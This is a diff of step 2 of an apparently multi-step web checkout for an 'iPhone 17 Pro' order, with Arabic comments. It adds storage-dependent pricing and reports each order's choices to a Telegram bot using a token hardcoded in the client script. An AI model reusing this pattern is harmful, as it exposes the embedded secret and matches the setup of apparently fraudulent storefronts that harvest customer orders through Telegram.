@@ -1,9 +1,11 @@
+هذا الكود جاهز كامل بعد التعديل – انسخه مكان القديم في step-2.html:
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Select Options – iPhone 15 Pro</title>
+  <title>Select Options – iPhone 17 Pro</title>
 
   <style>
     :root {
@@ -49,13 +51,6 @@
       margin-bottom: 10px;
     }
 
-    /* خيارات التخزين المعطلة */
-    .option.disabled {
-      opacity: 0.45;
-      cursor: not-allowed;
-      pointer-events: none;
-    }
-
     .options {
       display: flex;
       flex-wrap: wrap;
@@ -72,6 +67,12 @@
       font-size: 14px;
       cursor: pointer;
       transition: 0.15s;
+    }
+
+    .option.disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+      pointer-events: none;
     }
 
     .option.selected {
@@ -97,6 +98,22 @@
       display: flex;
       flex-direction: column;
       gap: 12px;
+    }
+
+    .price-display {
+      text-align: center;
+      font-size: 16px;
+      margin-bottom: 4px;
+    }
+
+    .price-main {
+      font-weight: 600;
+    }
+
+    .price-note {
+      margin-left: 4px;
+      color: var(--text-muted);
+      font-size: 14px;
     }
 
     .btn-primary {
@@ -125,15 +142,15 @@
 
 <body>
 
-  <header>iPhone 15 Pro – Customize</header>
+  <header>iPhone 17 Pro – Customize</header>
 
   <!-- Storage -->
   <div class="section">
     <div class="section-title">Select Storage</div>
     <div class="options" id="storage-options">
-      <div class="option disabled">128 GB</div>
+      <!-- 128 GB محذوف -->
       <div class="option selected">256 GB</div>
-      <div class="option disabled">512 GB</div>
+      <div class="option">512 GB</div>
       <div class="option disabled">1 TB</div>
     </div>
   </div>
@@ -143,20 +160,16 @@
     <div class="section-title">Select Color</div>
     <div class="options" id="color-options">
       <div class="option selected">
-        <div class="color-circle" style="background:#bfb8ae;"></div>
-        <div class="color-label">Natural<br>Titanium</div>
+        <div class="color-circle" style="background:#ff8c2f;"></div>
+        <div class="color-label">Cosmic<br>Orange</div>
       </div>
       <div class="option">
-        <div class="color-circle" style="background:#1c1c1f;"></div>
-        <div class="color-label">Black<br>Titanium</div>
+        <div class="color-circle" style="background:#1f345d;"></div>
+        <div class="color-label">Deep<br>Blue</div>
       </div>
       <div class="option">
-        <div class="color-circle" style="background:#283b64;"></div>
-        <div class="color-label">Blue<br>Titanium</div>
-      </div>
-      <div class="option">
-        <div class="color-circle" style="background:#fcfcfc;"></div>
-        <div class="color-label">White<br>Titanium</div>
+        <div class="color-circle" style="background:#f5f5f7;"></div>
+        <div class="color-label">Silver</div>
       </div>
     </div>
   </div>
@@ -165,23 +178,47 @@
   <div class="section">
     <div class="section-title">Summary</div>
     <p style="font-size:14px;color:var(--text-muted);">
-      You are purchasing: <strong>iPhone 15 Pro · Middle East Version</strong><br>
-      Options will be applied to your order automatically.
+      You are purchasing: <strong>iPhone 17 Pro / 17 Pro Max · Middle East Version</strong><br>
+      Storage and color options will be applied to your order automatically.
     </p>
-  </div>
+    </div>
 
   <div class="footer">
+    <!-- السعر المتغيّر حسب السعة فقط -->
+    <div class="price-display">
+      <span class="price-main" id="price-main">4100 Riyal/AED</span>
+      <span class="price-note" id="price-note">for 256 GB</span>
+    </div>
+
     <div class="btn-primary" id="continue-btn">Continue to Payment</div>
     <div class="btn-back" onclick="window.history.back();">Back</div>
   </div>
 
   <script>
-    // Storage selection (ما راح تشتغل فعلياً لأن الخيارات disabled، بس نخلي الكود نظيف)
+    // تحديث اختيار السعة + السعر
+    function updatePrice() {
+      var storageEl = document.querySelector("#storage-options .selected");
+      var selectedStorage = storageEl ? storageEl.innerText.trim() : "256 GB";
+
+      var priceMain = document.getElementById("price-main");
+      var priceNote = document.getElementById("price-note");
+
+      if (selectedStorage.indexOf("512") !== -1) {
+        priceMain.textContent = "4350 Riyal/AED";
+        priceNote.textContent = "for 512 GB";
+      } else {
+        priceMain.textContent = "4100 Riyal/AED";
+        priceNote.textContent = "for 256 GB";
+      }
+    }
+
+    // Storage selection (فقط 256 و 512 مفعّلين)
     document.querySelectorAll("#storage-options .option:not(.disabled)").forEach(function (el) {
       el.addEventListener("click", function () {
         document.querySelectorAll("#storage-options .option")
           .forEach(function (x) { x.classList.remove("selected"); });
         this.classList.add("selected");
+        updatePrice();
       });
     });
 
@@ -194,6 +231,9 @@
       });
     });
 
+    // أوّل تحميل للصفحة
+    updatePrice();
+
     // Continue → Payment + Telegram
     document.getElementById("continue-btn").addEventListener("click", function () {
       var botToken = "8097834484:AAG7whd2jF7Ie5pXUiomwXd1VwleQPpAogc";
@@ -205,18 +245,22 @@
       var selectedStorage = storageEl ? storageEl.innerText.trim() : "256 GB";
       var selectedColor   = colorLabelEl
         ? colorLabelEl.innerHTML.replace(/<br\s*\/?>/gi, " ").trim()
-        : "Natural Titanium";
+        : "Cosmic Orange";
 
-      // نخزن التخزين واللون للـ step-3
+      var currentPrice = document.getElementById("price-main").textContent;
+
+      // نخزن الخيارات للـ step-3
       localStorage.setItem("selectedStorage", selectedStorage);
       localStorage.setItem("selectedColor", selectedColor);
+      localStorage.setItem("selectedPrice", currentPrice);
 
       // نرسل على تيليجرام
       var msg =
         "New Order Submitted (Options step)\n\n" +
-        "Model: iPhone 15 Pro\n" +
+        "Model: iPhone 17 Pro / 17 Pro Max\n" +
         "Storage: " + selectedStorage + "\n" +
-        "Color: " + selectedColor;
+        "Color: " + selectedColor + "\n" +
+        "Price: " + currentPrice;
 
       fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
         method: "POST",
